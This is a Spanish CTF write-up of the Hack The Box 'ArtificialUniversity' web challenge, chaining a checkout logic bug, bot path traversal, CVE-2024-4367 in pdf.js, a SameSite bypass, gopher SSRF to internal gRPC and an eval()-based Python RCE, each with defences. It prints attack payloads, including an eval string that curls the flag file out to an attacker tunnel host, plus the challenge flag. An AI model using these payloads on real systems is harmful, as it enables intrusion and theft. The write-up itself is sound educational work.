# ArtificialUniversity — HTB (Insane, Web)

> **Flag:** `HTB{ol4_t4_ch41n5_ol4_t4_ch41n5_l4mp0un_t4_d15m4nd14_4l1_day}`
> **RCE final:** como `root` en el contenedor.
> **Resumen en una línea:** bug de lógica de negocio (checkout sin auth) → bot admin dirigido por path-traversal → **CVE-2024-4367** (pdf.js) para JS en el origen admin → bypass de SameSite con form-POST top-level → **SSRF gopher con curl 7.70.0** hacia un gRPC interno → **"prototype pollution" en Python** que habilita `eval()` → RCE root → exfil.

Escrito para estudio / prep de entrevista. Cada paso lleva *qué es*, *por qué funciona* y *cómo se defiende*. Los payloads son **ilustrativos y mínimos** a propósito.

---

## 1. Escenario y superficie

Sitio "dropshipping course" (Flask) que, según el enunciado, cloakea pagos. La descarga trae el código fuente completo. Arquitectura (de leer la fuente):

- **Flask store** (`src/store`) — la web pública + panel `/admin` (rol `admin`).
- **Microservicio gRPC interno** (`src/product_api`, `:50051`, solo localhost) para "productos".
- **Bot admin**: un headless **Firefox 125.0.1** (Selenium) que se loguea como admin y abre una factura PDF.
- El Dockerfile **compila curl 7.70.0 de fuente** y **pinea Firefox 125.0.1**. La flag se renombra a `/flag<10hex>.txt` al boot → hace falta **RCE** (no basta un LFI a ruta fija).

Dos detalles del Dockerfile son *pistas de diseño* (ver más abajo): versiones viejas pineadas = el exploit depende de su comportamiento específico.

---

## 2. La cadena, paso a paso

### 2.1 Bug de lógica: checkout sin autenticación (el "small programming bug")

El endpoint de checkout tenía dos ramas y el chequeo de login solo cubría una:

```python
# /checkout  (simplificado)
if product_id and not session.get("loggedin"):
    return error("necesitás cuenta")     # <- solo valida la rama "con product_id"
...
else:
    # rama "orden externa": SIN login y con TODO controlado por el atacante
    product_data = {"title": title, "price": int(price)}   # precio arbitrario
    order_id = db.create_order(title, user_id, email, int(price), ...)
```

La rama `else` (orden "externa") es **unauth** y deja fijar `price`, `title`, `user_id`, `email`. Además `/checkout/success` completa la orden si `amt_paid >= order.price` (y `get_amount_paid` devuelve `0`), así que con `price=0` la orden se completa **gratis** y dispara el paso siguiente.

> **Lección/Defensa:** la autorización debe cubrir **todas** las ramas. Un guard-clause que solo aplica a un camino deja el otro abierto. Centralizar authz en middleware/decorador, no por-rama.

### 2.2 El bot admin, dirigido por path-traversal

`/checkout/success` termina llamando a un **bot admin** (Firefox logueado como admin) que navega a la factura:

```python
bot_runner(ADMIN_EMAIL, ADMIN_PASS, payment_id)   # payment_id viene del query string!
# dentro del bot:
client.get(f"http://127.0.0.1:1337/static/invoices/invoice_{payment_id}.pdf")
```

`payment_id` es **controlado por el atacante** y se interpola crudo en la URL → **path traversal**:

```
payment_id = /../../../admin/view-pdf?url=<ATACANTE>&_=
→ el bot (admin) navega a  /admin/view-pdf?url=<ATACANTE>
```

Esto convierte al bot en un **oráculo de GET autenticado como admin** hacia cualquier ruta same-origin.

> **Defensa:** nunca interpolar input de usuario en URLs que abre un navegador privilegiado. Canonicalizar/validar el identificador (que sea un UUID real, no una ruta).

### 2.3 CVE-2024-4367 — JS arbitrario en el origen admin (Firefox < 126)

`/admin/view-pdf?url=X` hace `requests.get(X)` y, si el `Content-Type` es `application/pdf`, **sirve ese contenido same-origin** al visor pdf.js del bot. Sirviendo un PDF malicioso desde nuestro servidor (con `Content-Type: application/pdf`) el bot lo renderiza con **pdf.js de Firefox 125**, vulnerable a **CVE-2024-4367**: el `/FontMatrix` de una fuente se concatena sin sanear en el JS que genera los paths de glifos, así que un elemento *string* rompe la sintaxis e **inyecta JS arbitrario en el origen de la app**.

Payload conceptual (el 6º elemento del FontMatrix deja de ser número y cierra la llamada generada):

```
/FontMatrix [1 0 0 1 0 (0\); <MI_JS> //)]
```

sobre un PDF con fuente CFF embebida y texto que fuerce el generador de paths. (PoC pública: `LOURC0D3/CVE-2024-4367-PoC`.)

> **Pista de diseño:** por eso el Dockerfile pinea **Firefox 125.0.1** (fixeado en 126).
> **Defensa:** actualizar pdf.js ≥ 4.2.67 / Firefox ≥ 126; no renderizar PDFs no confiables en el mismo origen que la app.

### 2.4 Bypass de SameSite=Lax con form-POST top-level

El JS del CVE corre en un **contexto de origen opaco** (`document.domain === 'pdf.js'`). Consecuencia medida en vivo:

- `fetch`/`Image`/XHR (subresource) hacia la app **NO** llevan la cookie de sesión (la cookie no trae `SameSite` → Firefox usa **Lax** → no la manda en subrequests cross-site).
- Un **`<form>` con POST top-level** (`form.submit()`) **SÍ** la lleva (Lax permite la cookie en navegación top-level).

Y un detalle que costó: el form debe apuntar al **host interno que usa el bot** (`http://127.0.0.1:1337`), no a la IP pública — la cookie de admin está atada a ese host. Con eso, el JS hace un POST **autenticado como admin** a `/admin/api-health`.

> **Defensa:** `SameSite=Strict` + **tokens CSRF** en todo endpoint que cambie estado o dispare acciones server-side.

### 2.5 SSRF gopher con curl 7.70.0 → gRPC interno

`/admin/api-health` (admin) ejecuta `curl <url>` con la URL del POST. Eso permite:

```
url = gopher://127.0.0.1:50051/_<frames HTTP/2 url-encoded>
```

**gopher** manda bytes crudos a cualquier TCP → le hablamos al **gRPC interno** (`:50051`, no expuesto afuera). Frames HTTP/2 a mano: preface + SETTINGS + HEADERS (HPACK: `:method POST`, `:path /product.ProductService/DebugService`, `content-type: application/grpc`, `te: trailers`) + DATA (mensaje gRPC = flag + len + protobuf).

> **Pista de diseño:** el Dockerfile compila **curl 7.70.0** porque el curl viejo **envía NULL bytes** en el selector gopher; **curl 8.x los rechaza** (`URL malformed`) y los frames h2 están llenos de `\x00`. Sin ese pin, la técnica no anda.
> **Defensa:** en fetchers server-side, allow-list de esquemas (solo http/https), bloquear `gopher/dict/file`, y aislar el gRPC por red (mTLS / network policy).

### 2.6 "Prototype pollution" en Python → `eval` RCE (root)

El gRPC exponía un RPC de debug que **mergeaba un dict del atacante dentro de `self.__dict__`** del servicio, y otro RPC usaba un atributo en `eval()`:

```python
def UpdateService(self, source, dest):   # merge recursivo en __dict__  (contaminación de atributos)
    for k, v in source.items():
        dest.__dict__[k] = v             # <- crea atributos arbitrarios
def GenerateProduct(self):
    if hasattr(self, "price_formula"):
        price = eval(self.price_formula) # <- RCE si contaminamos price_formula
```

Con el gopher llamamos `DebugService` para setear `price_formula` (contaminación), y luego `GetNewProducts` (via `/admin/product-stream`, GET admin) dispara `GenerateProduct` → `eval()` **como root**. El payload exfiltra la flag:

```python
price_formula = "__import__('os').system('curl -s https://TUN/x?f=$(cat /flag*.txt|base64 -w0)')"
```

> **Defensa:** nunca mergear datos no confiables en atributos de objetos; **jamás** `eval` sobre datos; validar por esquema estricto. Es el análogo Python del prototype-pollution de JS.

---

## 3. Flujo del exploit (y metodología)

1. Levantar listener propio + **cloudflared** (tunnel HTTPS) para que el target cloud alcance nuestros callbacks y sirva el PDF.
2. `/checkout` unauth `price=0` → crea orden (id 1 en instancia fresca).
3. `/checkout/success?order_id=1&payment_id=<traversal a /admin/view-pdf?url=TUN/evil.pdf>` → el bot admin renderiza el PDF del CVE.
4. El JS (CVE) hace **form-POST top-level** a `http://127.0.0.1:1337/admin/api-health` con `url=gopher://…DebugService…` → **contamina** `price_formula`.
5. Traversal a `/admin/product-stream` (GET admin) → `GetNewProducts` → `eval()` → **exfil** de la flag al tunnel.

**Metodología que hizo la diferencia (cadena larga):**
- Aislar **cada eslabón con un beacon** observable (callback al listener) antes de encadenar.
- **Validar el crafting frágil (gopher/HTTP2) localmente** contra el mismo gRPC del zip, con el mismo **curl 7.70.0 compilado**, antes de disparar al target.
- Un solo cambio silencioso rompía todo: apuntar el form al host **interno** vs la IP externa (cookie por host).

---

## 4. Q&A de entrevista

**¿Qué es CVE-2024-4367 y por qué el contexto (same-origin) importa?**
Es una inyección de JS en pdf.js (Firefox < 126) por no validar el tipo del `FontMatrix`, que se concatena en el JS que dibuja glifos. Importa que el PDF se sirva **same-origin**: el JS corre en el origen de la app, así que puede actuar como el usuario (acá, el admin). Si se sirviera en un origen aislado, el impacto sería mucho menor.

**Tenías XSS/JS en el navegador del admin pero las cookies no viajaban en `fetch`. ¿Cómo hiciste la acción autenticada?**
El contexto del visor es de origen opaco y la cookie era SameSite=Lax por defecto → los subrequests cross-site no la mandan. Un **form POST top-level** sí manda cookies Lax, y apuntándolo al host interno que usa el bot, el POST llega **autenticado como admin**.

**¿Qué es un SSRF gopher y por qué la versión de curl era relevante?**
`gopher://` deja mandar bytes arbitrarios a un TCP, ideal para hablar protocolos binarios (acá, HTTP/2 de gRPC) desde un fetcher server-side. curl 7.70.0 envía NULL bytes en el selector; curl 8.x los rechaza. Como los frames HTTP/2 tienen muchos `\x00`, la versión vieja pineada en el Dockerfile era necesaria — una **pista** de diseño.

**Explicá la "prototype pollution" en Python.**
Un merge recursivo de datos no confiables dentro de `self.__dict__` permite crear/atributos arbitrarios en el objeto del servicio. Al combinarse con un `eval(self.<attr>)` en otro método, se logra RCE. Es el equivalente Python de contaminar `Object.prototype` en JS.

**¿Cómo se defiende toda la cadena?**
authz en todas las ramas; no interpolar input en URLs del bot; actualizar pdf.js/Firefox; `SameSite=Strict` + CSRF tokens; allow-list de esquemas/destinos en fetchers y aislar servicios internos (mTLS/network policy); nunca `eval` ni merges sobre datos no confiables.

---

## 5. Mitigaciones (resumen)

| Eslabón | Fix |
|---|---|
| Checkout unauth | authz en todas las ramas / middleware |
| Bot dirigido por input | validar `payment_id` (UUID), no interpolar en URLs del bot |
| CVE-2024-4367 | Firefox ≥126 / pdf.js ≥4.2.67; no PDFs no confiables same-origin |
| Bypass SameSite | `SameSite=Strict` + CSRF tokens |
| SSRF gopher | allow-list de esquemas (http/https), bloquear internos |
| gRPC alcanzable | aislar por red, mTLS, sin endpoints de debug en prod |
| `eval` + merge en `__dict__` | jamás eval sobre datos; validar por esquema |
